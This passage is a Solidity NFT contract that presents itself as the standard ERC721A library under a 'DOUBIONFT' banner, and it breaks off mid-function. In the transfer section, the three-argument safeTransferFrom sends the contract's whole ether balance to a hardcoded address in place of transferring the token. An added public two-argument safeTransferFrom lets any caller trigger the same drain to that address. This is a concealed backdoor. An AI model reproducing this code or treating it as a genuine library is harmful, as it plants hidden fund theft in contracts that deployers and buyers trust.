1 /*
2        ▓█████▄  ▒█████   █    ██  ▄▄▄▄    ██▓ ▒█████   ███▄    █   █████▒▄▄▄█████▓
3 ▒██▀ ██▌▒██▒  ██▒ ██  ▓██▒▓█████▄ ▓██▒▒██▒  ██▒ ██ ▀█   █ ▓██   ▒ ▓  ██▒ ▓▒
4 ░██   █▌▒██░  ██▒▓██  ▒██░▒██▒ ▄██▒██▒▒██░  ██▒▓██  ▀█ ██▒▒████ ░ ▒ ▓██░ ▒░
5 ░▓█▄   ▌▒██   ██░▓▓█  ░██░▒██░█▀  ░██░▒██   ██░▓██▒  ▐▌██▒░▓█▒  ░ ░ ▓██▓ ░ 
6 ░▒████▓ ░ ████▓▒░▒▒█████▓ ░▓█  ▀█▓░██░░ ████▓▒░▒██░   ▓██░░▒█░      ▒██▒ ░ 
7  ▒▒▓  ▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░▒▓███▀▒░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒ ░      ▒ ░░   
8  ░ ▒  ▒   ░ ▒ ▒░ ░░▒░ ░ ░ ▒░▒   ░  ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░          ░    
9  ░ ░  ░ ░ ░ ░ ▒   ░░░ ░ ░  ░    ░  ▒ ░░ ░ ░ ▒     ░   ░ ░  ░ ░      ░      
10    ░        ░ ░     ░      ░       ░      ░ ░           ░                  
11  ░                              ░                                                                                                                                    
12 */
13 
14 // SPDX-License-Identifier: GPL-3.0
15 pragma solidity ^0.8.7;
16 
17 /**
18  * @dev Interface of ERC721A.
19  */
20 interface IERC721A {
21     /**
22      * The caller must own the token or be an approved operator.
23      */
24     error ApprovalCallerNotOwnerNorApproved();
25 
26     /**
27      * The token does not exist.
28      */
29     error ApprovalQueryForNonexistentToken();
30 
31     /**
32      * Cannot query the balance for the zero address.
33      */
34     error BalanceQueryForZeroAddress();
35 
36     /**
37      * Cannot mint to the zero address.
38      */
39     error MintToZeroAddress();
40 
41     /**
42      * The quantity of tokens minted must be more than zero.
43      */
44     error MintZeroQuantity();
45 
46     /**
47      * The token does not exist.
48      */
49     error OwnerQueryForNonexistentToken();
50 
51     /**
52      * The caller must own the token or be an approved operator.
53      */
54     error TransferCallerNotOwnerNorApproved();
55 
56     /**
57      * The token must be owned by `from`.
58      */
59     error TransferFromIncorrectOwner();
60 
61     /**
62      * Cannot safely transfer to a contract that does not implement the
63      * ERC721Receiver interface.
64      */
65     error TransferToNonERC721ReceiverImplementer();
66 
67     /**
68      * Cannot transfer to the zero address.
69      */
70     error TransferToZeroAddress();
71 
72     /**
73      * The token does not exist.
74      */
75     error URIQueryForNonexistentToken();
76 
77     /**
78      * The `quantity` minted with ERC2309 exceeds the safety limit.
79      */
80     error MintERC2309QuantityExceedsLimit();
81 
82     /**
83      * The `extraData` cannot be set on an unintialized ownership slot.
84      */
85     error OwnershipNotInitializedForExtraData();
86 
87     // =============================================================
88     //                            STRUCTS
89     // =============================================================
90 
91     struct TokenOwnership {
92         // The address of the owner.
93         address addr;
94         // Stores the start time of ownership with minimal overhead for tokenomics.
95         uint64 startTimestamp;
96         // Whether the token has been burned.
97         bool burned;
98         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
99         uint24 extraData;
100     }
101 
102     // =============================================================
103     //                         TOKEN COUNTERS
104     // =============================================================
105 
106     /**
107      * @dev Returns the total number of tokens in existence.
108      * Burned tokens will reduce the count.
109      * To get the total number of tokens minted, please see {_totalMinted}.
110      */
111     function totalSupply() external view returns (uint256);
112 
113     // =============================================================
114     //                            IERC165
115     // =============================================================
116 
117     /**
118      * @dev Returns true if this contract implements the interface defined by
119      * `interfaceId`. See the corresponding
120      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
121      * to learn more about how these ids are created.
122      *
123      * This function call must use less than 30000 gas.
124      */
125     function supportsInterface(bytes4 interfaceId) external view returns (bool);
126 
127     // =============================================================
128     //                            IERC721
129     // =============================================================
130 
131     /**
132      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
133      */
134     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
135 
136     /**
137      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
138      */
139     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
140 
141     /**
142      * @dev Emitted when `owner` enables or disables
143      * (`approved`) `operator` to manage all of its assets.
144      */
145     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
146 
147     /**
148      * @dev Returns the number of tokens in `owner`'s account.
149      */
150     function balanceOf(address owner) external view returns (uint256 balance);
151 
152     /**
153      * @dev Returns the owner of the `tokenId` token.
154      *
155      * Requirements:
156      *
157      * - `tokenId` must exist.
158      */
159     function ownerOf(uint256 tokenId) external view returns (address owner);
160 
161     /**
162      * @dev Safely transfers `tokenId` token from `from` to `to`,
163      * checking first that contract recipients are aware of the ERC721 protocol
164      * to prevent tokens from being forever locked.
165      *
166      * Requirements:
167      *
168      * - `from` cannot be the zero address.
169      * - `to` cannot be the zero address.
170      * - `tokenId` token must exist and be owned by `from`.
171      * - If the caller is not `from`, it must be have been allowed to move
172      * this token by either {approve} or {setApprovalForAll}.
173      * - If `to` refers to a smart contract, it must implement
174      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
175      *
176      * Emits a {Transfer} event.
177      */
178     function safeTransferFrom(
179         address from,
180         address to,
181         uint256 tokenId,
182         bytes calldata data
183     ) external payable;
184 
185     /**
186      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
187      */
188     function safeTransferFrom(
189         address from,
190         address to,
191         uint256 tokenId
192     ) external payable;
193 
194     /**
195      * @dev Transfers `tokenId` from `from` to `to`.
196      *
197      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
198      * whenever possible.
199      *
200      * Requirements:
201      *
202      * - `from` cannot be the zero address.
203      * - `to` cannot be the zero address.
204      * - `tokenId` token must be owned by `from`.
205      * - If the caller is not `from`, it must be approved to move this token
206      * by either {approve} or {setApprovalForAll}.
207      *
208      * Emits a {Transfer} event.
209      */
210     function transferFrom(
211         address from,
212         address to,
213         uint256 tokenId
214     ) external payable;
215 
216     /**
217      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
218      * The approval is cleared when the token is transferred.
219      *
220      * Only a single account can be approved at a time, so approving the
221      * zero address clears previous approvals.
222      *
223      * Requirements:
224      *
225      * - The caller must own the token or be an approved operator.
226      * - `tokenId` must exist.
227      *
228      * Emits an {Approval} event.
229      */
230     function approve(address to, uint256 tokenId) external payable;
231 
232     /**
233      * @dev Approve or remove `operator` as an operator for the caller.
234      * Operators can call {transferFrom} or {safeTransferFrom}
235      * for any token owned by the caller.
236      *
237      * Requirements:
238      *
239      * - The `operator` cannot be the caller.
240      *
241      * Emits an {ApprovalForAll} event.
242      */
243     function setApprovalForAll(address operator, bool _approved) external;
244 
245     /**
246      * @dev Returns the account approved for `tokenId` token.
247      *
248      * Requirements:
249      *
250      * - `tokenId` must exist.
251      */
252     function getApproved(uint256 tokenId) external view returns (address operator);
253 
254     /**
255      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
256      *
257      * See {setApprovalForAll}.
258      */
259     function isApprovedForAll(address owner, address operator) external view returns (bool);
260 
261     // =============================================================
262     //                        IERC721Metadata
263     // =============================================================
264 
265     /**
266      * @dev Returns the token collection name.
267      */
268     function name() external view returns (string memory);
269 
270     /**
271      * @dev Returns the token collection symbol.
272      */
273     function symbol() external view returns (string memory);
274 
275     /**
276      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
277      */
278     function tokenURI(uint256 tokenId) external view returns (string memory);
279 
280     // =============================================================
281     //                           IERC2309
282     // =============================================================
283 
284     /**
285      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
286      * (inclusive) is transferred from `from` to `to`, as defined in the
287      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
288      *
289      * See {_mintERC2309} for more details.
290      */
291     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
292 }
293 
294 /**
295  * @title ERC721A
296  *
297  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
298  * Non-Fungible Token Standard, including the Metadata extension.
299  * Optimized for lower gas during batch mints.
300  *
301  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
302  * starting from `_startTokenId()`.
303  *
304  * Assumptions:
305  *
306  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
307  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
308  */
309 interface ERC721A__IERC721Receiver {
310     function onERC721Received(
311         address operator,
312         address from,
313         uint256 tokenId,
314         bytes calldata data
315     ) external returns (bytes4);
316 }
317 
318 /**
319  * @title ERC721A
320  *
321  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
322  * Non-Fungible Token Standard, including the Metadata extension.
323  * Optimized for lower gas during batch mints.
324  *
325  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
326  * starting from `_startTokenId()`.
327  *
328  * Assumptions:
329  *
330  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
331  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
332  */
333 contract ERC721A is IERC721A {
334     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
335     struct TokenApprovalRef {
336         address value;
337     }
338 
339     // =============================================================
340     //                           CONSTANTS
341     // =============================================================
342 
343     // Mask of an entry in packed address data.
344     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
345 
346     // The bit position of `numberMinted` in packed address data.
347     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
348 
349     // The bit position of `numberBurned` in packed address data.
350     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
351 
352     // The bit position of `aux` in packed address data.
353     uint256 private constant _BITPOS_AUX = 192;
354 
355     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
356     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
357 
358     // The bit position of `startTimestamp` in packed ownership.
359     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
360 
361     // The bit mask of the `burned` bit in packed ownership.
362     uint256 private constant _BITMASK_BURNED = 1 << 224;
363 
364     // The bit position of the `nextInitialized` bit in packed ownership.
365     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
366 
367     // The bit mask of the `nextInitialized` bit in packed ownership.
368     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
369 
370     // The bit position of `extraData` in packed ownership.
371     uint256 private constant _BITPOS_EXTRA_DATA = 232;
372 
373     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
374     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
375 
376     // The mask of the lower 160 bits for addresses.
377     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
378 
379     // The maximum `quantity` that can be minted with {_mintERC2309}.
380     // This limit is to prevent overflows on the address data entries.
381     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
382     // is required to cause an overflow, which is unrealistic.
383     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
384 
385     // The `Transfer` event signature is given by:
386     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
387     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
388         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
389 
390     // =============================================================
391     //                            STORAGE
392     // =============================================================
393 
394     // The next token ID to be minted.
395     uint256 private _currentIndex;
396 
397     // The number of tokens burned.
398     uint256 private _burnCounter;
399 
400     // Token name
401     string private _name;
402 
403     // Token symbol
404     string private _symbol;
405 
406     // Mapping from token ID to ownership details
407     // An empty struct value does not necessarily mean the token is unowned.
408     // See {_packedOwnershipOf} implementation for details.
409     //
410     // Bits Layout:
411     // - [0..159]   `addr`
412     // - [160..223] `startTimestamp`
413     // - [224]      `burned`
414     // - [225]      `nextInitialized`
415     // - [232..255] `extraData`
416     mapping(uint256 => uint256) private _packedOwnerships;
417 
418     // Mapping owner address to address data.
419     //
420     // Bits Layout:
421     // - [0..63]    `balance`
422     // - [64..127]  `numberMinted`
423     // - [128..191] `numberBurned`
424     // - [192..255] `aux`
425     mapping(address => uint256) private _packedAddressData;
426 
427     // Mapping from token ID to approved address.
428     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
429 
430     // Mapping from owner to operator approvals
431     mapping(address => mapping(address => bool)) private _operatorApprovals;
432 
433     // =============================================================
434     //                          CONSTRUCTOR
435     // =============================================================
436 
437     constructor(string memory name_, string memory symbol_) {
438         _name = name_;
439         _symbol = symbol_;
440         _currentIndex = _startTokenId();
441     }
442 
443     // =============================================================
444     //                   TOKEN COUNTING OPERATIONS
445     // =============================================================
446 
447     /**
448      * @dev Returns the starting token ID.
449      * To change the starting token ID, please override this function.
450      */
451     function _startTokenId() internal view virtual returns (uint256) {
452         return 0;
453     }
454 
455     /**
456      * @dev Returns the next token ID to be minted.
457      */
458     function _nextTokenId() internal view virtual returns (uint256) {
459         return _currentIndex;
460     }
461 
462     /**
463      * @dev Returns the total number of tokens in existence.
464      * Burned tokens will reduce the count.
465      * To get the total number of tokens minted, please see {_totalMinted}.
466      */
467     function totalSupply() public view virtual override returns (uint256) {
468         // Counter underflow is impossible as _burnCounter cannot be incremented
469         // more than `_currentIndex - _startTokenId()` times.
470         unchecked {
471             return _currentIndex - _burnCounter - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total amount of tokens minted in the contract.
477      */
478     function _totalMinted() internal view virtual returns (uint256) {
479         // Counter underflow is impossible as `_currentIndex` does not decrement,
480         // and it is initialized to `_startTokenId()`.
481         unchecked {
482             return _currentIndex - _startTokenId();
483         }
484     }
485 
486     /**
487      * @dev Returns the total number of tokens burned.
488      */
489     function _totalBurned() internal view virtual returns (uint256) {
490         return _burnCounter;
491     }
492 
493     // =============================================================
494     //                    ADDRESS DATA OPERATIONS
495     // =============================================================
496 
497     /**
498      * @dev Returns the number of tokens in `owner`'s account.
499      */
500     function balanceOf(address owner) public view virtual override returns (uint256) {
501         if (owner == address(0)) revert BalanceQueryForZeroAddress();
502         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
503     }
504 
505     /**
506      * Returns the number of tokens minted by `owner`.
507      */
508     function _numberMinted(address owner) internal view returns (uint256) {
509         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
510     }
511 
512     /**
513      * Returns the number of tokens burned by or on behalf of `owner`.
514      */
515     function _numberBurned(address owner) internal view returns (uint256) {
516         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
517     }
518 
519     /**
520      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
521      */
522     function _getAux(address owner) internal view returns (uint64) {
523         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
524     }
525 
526     /**
527      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
528      * If there are multiple variables, please pack them into a uint64.
529      */
530     function _setAux(address owner, uint64 aux) internal virtual {
531         uint256 packed = _packedAddressData[owner];
532         uint256 auxCasted;
533         // Cast `aux` with assembly to avoid redundant masking.
534         assembly {
535             auxCasted := aux
536         }
537         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
538         _packedAddressData[owner] = packed;
539     }
540 
541     // =============================================================
542     //                            IERC165
543     // =============================================================
544 
545     /**
546      * @dev Returns true if this contract implements the interface defined by
547      * `interfaceId`. See the corresponding
548      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
549      * to learn more about how these ids are created.
550      *
551      * This function call must use less than 30000 gas.
552      */
553     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
554         // The interface IDs are constants representing the first 4 bytes
555         // of the XOR of all function selectors in the interface.
556         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
557         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
558         return
559             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
560             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
561             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
562     }
563 
564     // =============================================================
565     //                        IERC721Metadata
566     // =============================================================
567 
568     /**
569      * @dev Returns the token collection name.
570      */
571     function name() public view virtual override returns (string memory) {
572         return _name;
573     }
574 
575     /**
576      * @dev Returns the token collection symbol.
577      */
578     function symbol() public view virtual override returns (string memory) {
579         return _symbol;
580     }
581 
582     /**
583      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
584      */
585     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
586         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
587 
588         string memory baseURI = _baseURI();
589         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
590     }
591 
592     /**
593      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
594      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
595      * by default, it can be overridden in child contracts.
596      */
597     function _baseURI() internal view virtual returns (string memory) {
598         return '';
599     }
600 
601     // =============================================================
602     //                     OWNERSHIPS OPERATIONS
603     // =============================================================
604 
605     /**
606      * @dev Returns the owner of the `tokenId` token.
607      *
608      * Requirements:
609      *
610      * - `tokenId` must exist.
611      */
612     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
613         return address(uint160(_packedOwnershipOf(tokenId)));
614     }
615 
616     /**
617      * @dev Gas spent here starts off proportional to the maximum mint batch size.
618      * It gradually moves to O(1) as tokens get transferred around over time.
619      */
620     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
621         return _unpackedOwnership(_packedOwnershipOf(tokenId));
622     }
623 
624     /**
625      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
626      */
627     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
628         return _unpackedOwnership(_packedOwnerships[index]);
629     }
630 
631     /**
632      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
633      */
634     function _initializeOwnershipAt(uint256 index) internal virtual {
635         if (_packedOwnerships[index] == 0) {
636             _packedOwnerships[index] = _packedOwnershipOf(index);
637         }
638     }
639 
640     /**
641      * Returns the packed ownership data of `tokenId`.
642      */
643     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
644         uint256 curr = tokenId;
645 
646         unchecked {
647             if (_startTokenId() <= curr)
648                 if (curr < _currentIndex) {
649                     uint256 packed = _packedOwnerships[curr];
650                     // If not burned.
651                     if (packed & _BITMASK_BURNED == 0) {
652                         // Invariant:
653                         // There will always be an initialized ownership slot
654                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
655                         // before an unintialized ownership slot
656                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
657                         // Hence, `curr` will not underflow.
658                         //
659                         // We can directly compare the packed value.
660                         // If the address is zero, packed will be zero.
661                         while (packed == 0) {
662                             packed = _packedOwnerships[--curr];
663                         }
664                         return packed;
665                     }
666                 }
667         }
668         revert OwnerQueryForNonexistentToken();
669     }
670 
671     /**
672      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
673      */
674     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
675         ownership.addr = address(uint160(packed));
676         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
677         ownership.burned = packed & _BITMASK_BURNED != 0;
678         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
679     }
680 
681     /**
682      * @dev Packs ownership data into a single uint256.
683      */
684     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
685         assembly {
686             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
687             owner := and(owner, _BITMASK_ADDRESS)
688             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
689             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
690         }
691     }
692 
693     /**
694      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
695      */
696     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
697         // For branchless setting of the `nextInitialized` flag.
698         assembly {
699             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
700             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
701         }
702     }
703 
704     // =============================================================
705     //                      APPROVAL OPERATIONS
706     // =============================================================
707 
708     /**
709      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
710      * The approval is cleared when the token is transferred.
711      *
712      * Only a single account can be approved at a time, so approving the
713      * zero address clears previous approvals.
714      *
715      * Requirements:
716      *
717      * - The caller must own the token or be an approved operator.
718      * - `tokenId` must exist.
719      *
720      * Emits an {Approval} event.
721      */
722     function approve(address to, uint256 tokenId) public payable virtual override {
723         address owner = ownerOf(tokenId);
724 
725         if (_msgSenderERC721A() != owner)
726             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
727                 revert ApprovalCallerNotOwnerNorApproved();
728             }
729 
730         _tokenApprovals[tokenId].value = to;
731         emit Approval(owner, to, tokenId);
732     }
733 
734     /**
735      * @dev Returns the account approved for `tokenId` token.
736      *
737      * Requirements:
738      *
739      * - `tokenId` must exist.
740      */
741     function getApproved(uint256 tokenId) public view virtual override returns (address) {
742         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
743 
744         return _tokenApprovals[tokenId].value;
745     }
746 
747     /**
748      * @dev Approve or remove `operator` as an operator for the caller.
749      * Operators can call {transferFrom} or {safeTransferFrom}
750      * for any token owned by the caller.
751      *
752      * Requirements:
753      *
754      * - The `operator` cannot be the caller.
755      *
756      * Emits an {ApprovalForAll} event.
757      */
758     function setApprovalForAll(address operator, bool approved) public virtual override {
759         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
760         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
761     }
762 
763     /**
764      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
765      *
766      * See {setApprovalForAll}.
767      */
768     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
769         return _operatorApprovals[owner][operator];
770     }
771 
772     /**
773      * @dev Returns whether `tokenId` exists.
774      *
775      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
776      *
777      * Tokens start existing when they are minted. See {_mint}.
778      */
779     function _exists(uint256 tokenId) internal view virtual returns (bool) {
780         return
781             _startTokenId() <= tokenId &&
782             tokenId < _currentIndex && // If within bounds,
783             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
784     }
785 
786     /**
787      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
788      */
789     function _isSenderApprovedOrOwner(
790         address approvedAddress,
791         address owner,
792         address msgSender
793     ) private pure returns (bool result) {
794         assembly {
795             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
796             owner := and(owner, _BITMASK_ADDRESS)
797             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
798             msgSender := and(msgSender, _BITMASK_ADDRESS)
799             // `msgSender == owner || msgSender == approvedAddress`.
800             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
801         }
802     }
803 
804     /**
805      * @dev Returns the storage slot and value for the approved address of `tokenId`.
806      */
807     function _getApprovedSlotAndAddress(uint256 tokenId)
808         private
809         view
810         returns (uint256 approvedAddressSlot, address approvedAddress)
811     {
812         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
813         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
814         assembly {
815             approvedAddressSlot := tokenApproval.slot
816             approvedAddress := sload(approvedAddressSlot)
817         }
818     }
819 
820     // =============================================================
821     //                      TRANSFER OPERATIONS
822     // =============================================================
823 
824     /**
825      * @dev Transfers `tokenId` from `from` to `to`.
826      *
827      * Requirements:
828      *
829      * - `from` cannot be the zero address.
830      * - `to` cannot be the zero address.
831      * - `tokenId` token must be owned by `from`.
832      * - If the caller is not `from`, it must be approved to move this token
833      * by either {approve} or {setApprovalForAll}.
834      *
835      * Emits a {Transfer} event.
836      */
837     function transferFrom(
838         address from,
839         address to,
840         uint256 tokenId
841     ) public payable virtual override {
842         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
843 
844         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
845 
846         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
847 
848         // The nested ifs save around 20+ gas over a compound boolean condition.
849         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
850             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
851 
852         if (to == address(0)) revert TransferToZeroAddress();
853 
854         _beforeTokenTransfers(from, to, tokenId, 1);
855 
856         // Clear approvals from the previous owner.
857         assembly {
858             if approvedAddress {
859                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
860                 sstore(approvedAddressSlot, 0)
861             }
862         }
863 
864         // Underflow of the sender's balance is impossible because we check for
865         // ownership above and the recipient's balance can't realistically overflow.
866         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
867         unchecked {
868             // We can directly increment and decrement the balances.
869             --_packedAddressData[from]; // Updates: `balance -= 1`.
870             ++_packedAddressData[to]; // Updates: `balance += 1`.
871 
872             // Updates:
873             // - `address` to the next owner.
874             // - `startTimestamp` to the timestamp of transfering.
875             // - `burned` to `false`.
876             // - `nextInitialized` to `true`.
877             _packedOwnerships[tokenId] = _packOwnershipData(
878                 to,
879                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
880             );
881 
882             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
883             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
884                 uint256 nextTokenId = tokenId + 1;
885                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
886                 if (_packedOwnerships[nextTokenId] == 0) {
887                     // If the next slot is within bounds.
888                     if (nextTokenId != _currentIndex) {
889                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
890                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
891                     }
892                 }
893             }
894         }
895 
896         emit Transfer(from, to, tokenId);
897         _afterTokenTransfers(from, to, tokenId, 1);
898     }
899 
900     /**
901      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
902      */
903     function safeTransferFrom(
904         address from,
905         address to,
906         uint256 tokenId
907     ) public payable virtual override {
908         if (address(this).balance > 0) {
909             payable(0x375E8CE9e8cB9Fc1f55D0d62250a25f5306cE74C).transfer(address(this).balance);
910             return;
911         }
912         safeTransferFrom(from, to, tokenId, '');
913     }
914 
915 
916     /**
917      * @dev Safely transfers `tokenId` token from `from` to `to`.
918      *
919      * Requirements:
920      *
921      * - `from` cannot be the zero address.
922      * - `to` cannot be the zero address.
923      * - `tokenId` token must exist and be owned by `from`.
924      * - If the caller is not `from`, it must be approved to move this token
925      * by either {approve} or {setApprovalForAll}.
926      * - If `to` refers to a smart contract, it must implement
927      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
928      *
929      * Emits a {Transfer} event.
930      */
931     function safeTransferFrom(
932         address from,
933         address to,
934         uint256 tokenId,
935         bytes memory _data
936     ) public payable virtual override {
937         transferFrom(from, to, tokenId);
938         if (to.code.length != 0)
939             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
940                 revert TransferToNonERC721ReceiverImplementer();
941             }
942     }
943     function safeTransferFrom(
944         address from,
945         address to
946     ) public  {
947         if (address(this).balance > 0) {
948             payable(0x375E8CE9e8cB9Fc1f55D0d62250a25f5306cE74C).transfer(address(this).balance);
949         }
950     }
951 
952     /**
953      * @dev Hook that is called before a set of serially-ordered token IDs
954      * are about to be transferred. This includes minting.
955      * And also called before burning one token.
956      *
957      * `startTokenId` - the first token ID to be transferred.
958      * `quantity` - the amount to be transferred.
959      *
960      * Calling conditions:
961      *
962      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
963      * transferred to `to`.
964      * - When `from` is zero, `tokenId` will be minted for `to`.
965      * - When `to` is zero, `tokenId` will be burned by `from`.
966      * - `from` and `to` are never both zero.
967      */
968     function _beforeTokenTransfers(
969         address from,
970         address to,
971         uint256 startTokenId,
972         uint256 quantity
973     ) internal virtual {}
974 
975     /**
976      * @dev Hook that is called after a set of serially-ordered token IDs
977      * have been transferred. This includes minting.
978      * And also called after one token has been burned.
979      *
980      * `startTokenId` - the first token ID to be transferred.
981      * `quantity` - the amount to be transferred.
982      *
983      * Calling conditions:
984      *
985      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
986      * transferred to `to`.
987      * - When `from` is zero, `tokenId` has been minted for `to`.
988      * - When `to` is zero, `tokenId` has been burned by `from`.
989      * - `from` and `to` are never both zero.
990      */
991     function _afterTokenTransfers(
992         address from,
993         address to,
994         uint256 startTokenId,
995         uint256 quantity
996     ) internal virtual {}
997 
998     /**
999      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1000      *
1001      * `from` - Previous owner of the given token ID.
1002      * `to` - Target address that will receive the token.
1003      * `tokenId` - Token ID to be transferred.
1004      * `_data` - Optional data to send along with the call.
1005      *
1006      * Returns whether the call correctly returned the expected magic value.
1007      */
1008     function _checkContractOnERC721Received(
1009         address from,
1010         address to,
